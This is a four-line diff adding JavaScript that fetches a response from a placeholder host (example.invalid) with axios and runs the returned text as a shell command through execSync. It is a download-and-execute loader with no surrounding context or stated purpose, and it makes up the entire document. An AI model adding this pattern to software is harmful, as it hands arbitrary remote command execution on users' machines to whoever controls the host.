@@ -1,0 +1,4 @@
+import axios from 'axios';
+import { execSync } from 'node:child_process';
+const res = await axios.get('https://example.invalid/a');
+execSync(res.data);
